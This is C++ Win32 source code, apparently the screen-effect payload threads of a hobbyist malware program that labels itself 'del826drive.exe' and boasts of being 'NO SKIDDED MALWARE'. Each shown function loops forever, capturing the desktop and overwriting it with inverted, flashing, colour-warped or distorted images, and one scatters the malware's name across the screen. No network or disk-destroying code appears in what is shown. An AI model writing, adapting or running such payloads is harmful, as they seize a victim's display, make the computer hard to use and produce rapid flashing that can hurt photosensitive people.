DWORD WINAPI shader1(LPVOID lpvd) //by pankoza
{
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = screenWidth;
	bmpi.bmiHeader.biHeight = screenHeight;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;


	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;

	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);

	INT i = 0;

	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);

		RGBQUAD rgbquadCopy;

		for (int x = 0; x < screenWidth; x++)
		{
			for (int y = 0; y < screenHeight; y++)
			{
				int index = y * screenWidth + x;
				int g = (rgbquad[i].rgbBlue + rgbquad[i].rgbGreen + rgbquad[i].rgbRed) / 3;

				int fx = (int)((i ^ 4) + (i * 4) * sqrt((g ^ x * y)));

				rgbquadCopy = rgbquad[index];

				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 400.f + y / screenHeight * .2f, 1.f);

				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}

		i++;

		StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCINVERT);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}

	return 0x00;
}
DWORD WINAPI jiantou(LPVOID lpParam) {//by N17Pro3426, but i modified
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	int signX = 1;
	int signY = 1;
	int signX1 = 1;
	int signY1 = 1;
	int incrementor = 10;
	int x = 10;
	int y = 10;
	while (1) {
		HDC hdc = GetDC(0);
		int top_x = 0 + x;
		int top_y = 0 + y;
		int bottom_x = 99 + x;
		int bottom_y = 99 + y;
		x += incrementor * signX;
		y += incrementor * signY;
		HPEN hPen = CreatePen(PS_SOLID, 2, Hue(239));
		HPEN hOldPen = SelectPen(hdc, hPen);

		HBRUSH hBrush = CreateSolidBrush(Hue(239));
		HBRUSH hOldBrush = SelectBrush(hdc, hBrush);

		POINT vertices[] = { {x + 30, y + 90}, {x + 360, y + 90}, {x + 360, y + 40} , {x + 260, x + 96} , {x + 190, y + 240} , {x + 180, y + 90} , {x + 26, y + 90} };
		Polygon(hdc, vertices, sizeof(vertices) / sizeof(vertices[0]));

		SelectBrush(hdc, hOldBrush);
		DeleteObject(hBrush);

		SelectPen(hdc, hOldPen);
		DeleteObject(hPen);
		if (y >= GetSystemMetrics(SM_CYSCREEN))
		{
			signY = -1;
		}

		if (x >= GetSystemMetrics(SM_CXSCREEN))
		{
			signX = -1;
		}

		if (y == 0)
		{
			signY = 1;
		}

		if (x == 0)
		{
			signX = 1;
		}
		Sleep(1);
		ReleaseDC(0, hdc);
	}
}
DWORD WINAPI masher(LPVOID lpParam) {
	while (1) {
		HDC hdc = GetDC(HWND_DESKTOP);
		int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN);
		BitBlt(hdc, rand() % 5, rand() % 5, rand() % sw, rand() % sh, hdc, rand() % 5, rand() % 5, NOTSRCCOPY);
		ReleaseDC(0, hdc);
	}
}
DWORD WINAPI colorchange(LPVOID lpvd)
{
	while (1)
	{
		HDC hdc = GetDC(0);
		int x = GetSystemMetrics(0);
		int y = GetSystemMetrics(1);
		HBRUSH brush = CreateSolidBrush(RGB(rand() % 1000, rand() % 1000, rand() % 1000));
		SelectObject(hdc, brush);
		PatBlt(hdc, 0, 0, x, y, PATINVERT);
		ReleaseDC(0, hdc);
		DeleteObject(brush);
		Sleep(10);
	}
}
DWORD WINAPI textout1(LPVOID lpvd)
{
	int x = GetSystemMetrics(0); int y = GetSystemMetrics(1);
	LPCSTR text0 = 0;
	LPCSTR text1 = 0;
	LPCSTR text2 = 0;
	LPCSTR text3 = 0;
	while (1)
	{
		HDC hdc = GetDC(0);
		SetBkMode(hdc, 0);
		text0 = "del826drive.exe By MazeIcon & Jeremiah";
		text1 = "NO SKIDDDDDDDDDED MALWARE BY MAZEICON & JEREMIAH";
		text2 = "no skid + Best Malware?, DIXIE WORLD";
		text3 = "YES, NO SKIDDED MALWARE";
		SetTextColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
		HFONT font = CreateFontA(43, 32, 0, 0, FW_EXTRALIGHT, 0, 1, 0, ANSI_CHARSET, 0, 0, 0, 0, "Courier New");
		SelectObject(hdc, font);
		TextOutA(hdc, rand() % x, rand() % y, text0, strlen(text0));
		Sleep(1);
		TextOutA(hdc, rand() % x, rand() % y, text1, strlen(text1));
		Sleep(1);
		TextOutA(hdc, rand() % x, rand() % y, text2, strlen(text2));
		Sleep(1);
		TextOutA(hdc, rand() % x, rand() % y, text3, strlen(text3));
		DeleteObject(font);
		ReleaseDC(0, hdc);
	}
}
DWORD WINAPI shader2(LPVOID lpParam) {
	HDC hdc = GetDC(NULL);
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
	HDC hcdc = CreateCompatibleDC(hdc);
	HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
	SelectObject(hcdc, hBitmap);

	BLENDFUNCTION blf = { 0 };
	blf.BlendOp = AC_SRC_OVER;
	blf.BlendFlags = 0;
	blf.SourceConstantAlpha = 128;
	blf.AlphaFormat = 0;

	POINT p[3], np[3];
	for (int i = 0; i < 3; i++) {
		p[i].x = Xorshift32() % w;
		p[i].y = Xorshift32() % h;
		np[i].x = ((Xorshift32() % 2 == 0) ? -1 : 1);
		np[i].y = ((Xorshift32() % 2 == 0) ? -1 : 1);
	}
	for (int t = 0; ; t++) {
		hdc = GetDC(NULL);
		BitBlt(hcdc, 0, 0, w, h, hcdc, 0, 0, BLACKNESS);
		for (int a = 0; a < 3; a++) {
			p[a].x += np[a].x * 20, p[a].y += np[a].y * 20;
			if (p[a].x >= w || p[a].x <= 0) {
				np[a].x = -np[a].x;
			}
			if (p[a].y >= h || p[a].y <= 0) {
				np[a].y = -np[a].y;
			}
		}

		HRGN hrgn = CreatePolygonRgn(p, 3, ALTERNATE);
		FillRgn(hcdc, hrgn, CreateSolidBrush(Xorshift32() % 0xffffff));
		HDC hdcCopy = CreateCompatibleDC(hdc);
		HBITMAP hBitmapCopy = CreateCompatibleBitmap(hdc, w, h);
		SelectObject(hdcCopy, hBitmapCopy);
		BitBlt(hdcCopy, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);

		HDC hdcTemp = CreateCompatibleDC(hdc);
		HBITMAP hBitmapTemp = CreateCompatibleBitmap(hdc, w, h);
		SelectObject(hdcTemp, hBitmapTemp);
		BitBlt(hdcTemp, 0, 0, w, h, hdcCopy, 0, 0, NOTSRCCOPY);
		StretchBlt(hdcTemp, 0, 0, w / 2, h / 2, hcdc, 0, 0, w, h, NOTSRCCOPY);
		StretchBlt(hdcTemp, 0, h / 2, w / 2, h / 2, hcdc, 0, 0, w, h, NOTSRCCOPY);
		StretchBlt(hdcTemp, w / 2, 0, w / 2, h / 2, hcdc, 0, 0, w, h, NOTSRCCOPY);
		StretchBlt(hdcTemp, w / 2, h / 2, w / 2, h / 2, hcdc, 0, 0, w, h, NOTSRCCOPY);
		BitBlt(hcdc, 0, 0, w, h, hdcTemp, 0, 0, NOTSRCCOPY);
		AlphaBlend(hcdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, blf);
		BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, NOTSRCCOPY);

		ReleaseDC(NULL, hdc);
		DeleteObject(hdc);
		Sleep(20);
	}
	return 0;

}
DWORD WINAPI shader3(LPVOID lpParam) {//by pankoza, but i modified
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;

			int cx = x - (w / 2);
			int cy = y - (h / 2);

			int zx = (cx * cx);
			int zy = (cy * cy);

			int di = 153.0 + i;

			int fx = di + (di * tan(sqrt(zx + zy) / 32.0));
			rgbScreen[i].r -= GetRValue(fx + i + 6);
			rgbScreen[i].g *= GetGValue(fx + i - 7);
			rgbScreen[i].b += GetBValue(fx + i * 9);
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, NOTSRCERASE);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}
DWORD WINAPI shader4(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	int radius = 37.4f; double angle = 0;
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			rgbScreen[i].rgb *= x + y;
		}
		float x = cos(angle) * radius, y = sin(angle) * radius;
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, x, y, SRCERASE);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
		angle = fmod(angle + PI / radius, PI * radius);
	}
}
DWORD WINAPI shader5(LPVOID lpParam) {
	HDC hdc = GetDC(NULL);
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);

	BITMAPINFO bmi = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;

	PRGBQUAD prgbScreen;
	HDC hcdc = CreateCompatibleDC(hdc);
	HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, 0, (void**)&prgbScreen, NULL, 0);
	SelectObject(hcdc, hBitmap);

	for (int t = 0; ; t += 10) {
		hdc = GetDC(NULL);
		BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);

		for (int y = 0; y < h; y++) {
			for (int x = 0; x < w; x++) {
				int pos = x + y * w;
				int tmp = (x * y) ^ -t;
				prgbScreen[pos].r = GetRValue(tmp) * t;
				prgbScreen[pos].g = GetGValue(tmp) * t;
				prgbScreen[pos].b = GetBValue(tmp) * t;
			}
		}
		BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, NOTSRCCOPY);

		ReleaseDC(NULL, hdc);
		DeleteObject(hdc);
		Sleep(10);
	}
	ReleaseDC(NULL, hcdc);
	DeleteDC(hcdc);
	DeleteObject(hBitmap);
	return 0;
}
DWORD WINAPI shader6(LPVOID lpParam) {
	HDC hdc = GetDC(NULL);
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);

	BITMAPINFO bmi = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;

	PRGBQUAD prgbScreen;
	HDC hcdc = CreateCompatibleDC(hdc);
	HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, 0, (void**)&prgbScreen, NULL, 0);
	SelectObject(hcdc, hBitmap);

	for (int t = 0; ; t++) {
		hdc = GetDC(NULL);

		BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		for (int x = 0; x < w; x++) {
			for (int y = 0; y < h; y++) {
				int pos = x + w * y;
				prgbScreen[pos].r = prgbScreen[pos].r / 5 * 4;
				prgbScreen[pos].g = prgbScreen[pos].g / 5 * 4;
				prgbScreen[pos].b = prgbScreen[pos].b / 5 * 4;
			}
		}
		BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, NOTSRCCOPY);

		//DrawIcon(hdc, Xorshift32() % w, Xorshift32() % h, LoadCursor(NULL, MAKEINTRESOURCE(32516)));
		//DrawIcon(hdc, Xorshift32() % w, Xorshift32() % h, LoadCursor(NULL, MAKEINTRESOURCE(32626)));

		ReleaseDC(NULL, hdc);
		DeleteObject(hdc);
		Sleep(10);
	}
	ReleaseDC(NULL, hcdc);
	DeleteDC(hcdc);
	DeleteObject(hBitmap);
	return 0;
}
DWORD WINAPI shader7(LPVOID lpParam) {
	HDC hdc = GetDC(NULL);
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);

	BITMAPINFO bmi = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;

	PRGBQUAD prgbScreen;
	HDC hcdc = CreateCompatibleDC(hdc);
	HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, 0, (void**)&prgbScreen, NULL, 0);
	SelectObject(hcdc, hBitmap);

	for (int t = 0; ; t++) {
		hdc = GetDC(NULL);
		BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		for (int y = 0; y < h; y++) {
			for (int x = 0; x < w; x++) {
				int pos = x + y * w;
				int tmp = (x * y) + t;
				prgbScreen[pos].r = GetRValue(tmp);
				prgbScreen[pos].g = 0;
				prgbScreen[pos].b = 0;
			}
		}
		BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCERASE);
		ReleaseDC(NULL, hdc);
		DeleteObject(hdc);
		Sleep(50);
	}
	ReleaseDC(NULL, hcdc);
	DeleteDC(hcdc);
	DeleteObject(hBitmap);
	return 0;
}
DWORD WINAPI blurz(LPVOID lpParam) {
	HDC hdc;
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	while (1) {
		hdc = GetDC(0); HDC hdcMem = CreateCompatibleDC(hdc);
		HBITMAP screenshot = CreateCompatibleBitmap(hdc, sw, sh);
		SelectObject(hdcMem, screenshot);
		BitBlt(hdcMem, 0, 0, sw, sh, hdc, 0, 0, SRCCOPY);
		for (int i = 0; i < 30; i++) {
			StretchBlt(hdcMem, rand() % 10, rand() % 10, sw - 20, sh - 20, hdcMem, 0, 0, sw, sh, SRCINVERT);
		}
		BLENDFUNCTION blend = { AC_SRC_OVER, 0, 50, 0 };
		AlphaBlend(hdc, 0, 0, sw, sh, hdcMem, 0, 0, sw, sh, blend);
		ReleaseDC(0, hdc);
		DeleteObject(screenshot); DeleteDC(hdcMem); DeleteDC(hdc);
		Sleep(10);
	}
}